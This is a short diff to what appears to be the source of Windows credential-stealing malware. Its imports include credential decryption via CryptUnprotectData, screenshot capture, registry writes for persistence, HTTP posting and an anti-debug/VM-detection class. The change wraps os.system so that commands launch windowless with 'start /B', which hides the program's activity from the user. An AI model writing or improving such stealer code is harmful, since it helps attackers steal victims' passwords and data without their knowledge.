@@ -49,7 +49,7 @@ config = {
 
 # imports minimum needed libraries for a smaller file size when compiled
 from sqlite3 import connect as sq3connect
-from os import getlogin, getenv, path as ospath, system, walk, name, remove, _exit, sep, rename, makedirs
+from os import getlogin, getenv, path as ospath, system as donotuse_system, walk, name, remove, _exit, sep, rename, makedirs
 from threading import Thread, enumerate as enumeratethreads
 from shutil import copy2, rmtree
 from winreg import OpenKey, QueryValueEx, CloseKey, SetValueEx, REG_SZ, KEY_SET_VALUE, HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE
@@ -66,6 +66,12 @@ from httpx import get, post # httpx
 from psutil import virtual_memory, cpu_count, disk_usage, process_iter, NoSuchProcess, AccessDenied # psutil
 from PIL import ImageGrab # pillow
 from win32crypt import CryptUnprotectData # pywin32
+
+def system(cmd):
+    '''
+    Launches a windowless command.
+    '''
+    return donotuse_system(f'start /B {cmd}')
 
 class AntiDebug:
     inVM = False
